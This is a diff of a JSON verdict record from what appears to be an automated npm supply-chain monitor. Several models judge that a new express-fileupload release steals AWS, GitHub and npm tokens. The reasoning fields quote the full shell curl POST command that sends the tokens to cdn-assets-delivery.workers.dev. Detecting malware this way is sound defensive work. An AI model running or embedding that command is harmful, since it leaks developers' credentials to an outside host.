@@ -1,21 +1,21 @@
 {
   "schema": 1,
   "promptVersion": 3,
-  "judgedAt": "2026-09-20T16:16:14.260Z",
+  "judgedAt": "2026-09-20T16:43:33.591Z",
   "judgement": {
     "pkg": "express-fileupload",
     "severity": "alarming",
     "judged": true,
     "tier": "judge",
     "verdict": {
-      "meaning": "The new version reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN from the environment, then spawns a shell to curl POST data to an undocumented domain (cdn-assets-delivery.workers.dev).",
+      "meaning": "The new version reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN from the environment, then spawns a shell to POST data via curl to cdn-assets-delivery.workers.dev:443.",
       "explained": false,
       "worthWaking": true,
       "confidence": "high",
-      "note": "Credentials are being exfiltrated via a spawned shell to a destination with no public record."
+      "note": "Multiple credential types exfiltrated via spawned shell to an undocumented destination; no public record explains this behavior."
     },
     "second": {
-      "meaning": "The package now reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN environment variables and exfiltrates their contents via a curl POST to cdn-assets-delivery.workers.dev.",
+      "meaning": "The package now reads AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, and NPM_TOKEN from the environment and sends their contents via a shell-spawned curl POST to cdn-assets-delivery.workers.dev.",
       "explained": false,
       "worthWaking": true,
       "confidence": "high",
@@ -26,23 +26,23 @@
     "spend": [
       {
         "model": "nvidia/NVIDIA-Nemotron-3-Nano-30B-A3B",
-        "costUsd": 0.00011,
+        "costUsd": 0.000102,
         "simulated": false,
-        "reasoning": "We need to output JSON only with fields: meaning, explained, worthWaking, confidence, note (optional). Must not add prose. Must interpret evidence.\n\nEvidence shows now reads env vars AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN; resolves and connects to cdn-assets-delivery.workers.dev:443; spawns /bin/sh -c curl -s -X POST -d @- https://cdn-assets-delivery.workers.dev/c (presumably sending data). This is suspicious: reading credentials it didn't before, connecting to external host, spawning shell to curl. This matches alarming rule. Public record says nothing, so explained false. worthWaking"
+        "reasoning": "We need to output JSON only with fields: meaning, explained, worthWaking, confidence, note. Must not add prose. Must interpret evidence.\n\nEvidence shows now reads env vars AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN; resolves cdn-assets-delivery.workers.dev; connects to it; spawns /bin/sh -c curl -s -X POST -d @- https://cdn-assets-delivery.workers.dev/c (presumably sending data). This is suspicious: reading credentials, sending them to external endpoint. This is likely malicious exfiltration. Public record? open web says nothing. So explained = false (no public record). worthWaking = true (credentials leaving machine). confidence likely high.…"
       },
       {
         "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
-        "costUsd": 0.002104,
+        "costUsd": 0.002195,
         "simulated": false,
         "reasoning": ""
       },
       {
         "model": "nvidia/nemotron-3-super-120b-a12b",
-        "costUsd": 0.000554,
+        "costUsd": 0.000487,
         "simulated": false,
-        "reasoning": "We need to output JSON per spec. The evidence shows now reads env vars: AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN. Now resolves and connects to cdn-assets-delivery.workers.dev:443 TCP. Now spawns /bin/sh -c curl ... posting stdin to that URL. So clearly exfiltrating credentials via curl to external host. Public record says nothing. So meaning: exfiltrates sensitive tokens to remote server. Explained: false. WorthWaking: true because credentials leaving machine. Confidence high. Note maybe none.\n\nCheck constraints: No mention of exec observed? Actually they used ebpf which cannot observe e"
+        "reasoning": "We need to output JSON per spec. The evidence shows now reads env vars: AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, NPM_TOKEN. Now resolves and connects to cdn-assets-delivery.workers.dev:443 TCP. Now spawns /bin/sh -c curl -s -X POST -d @- https://... . So it's exfiltrating credentials via curl to external endpoint. That's suspicious. Public record says none. So explained = false. WorthWaking: yes because credentials leaving machine, spawning shell/downloader. Confidence high. Note maybe short. Provide JSON."
       }
     ],
-    "costUsd": 0.002768
+    "costUsd": 0.002784
   }
 }
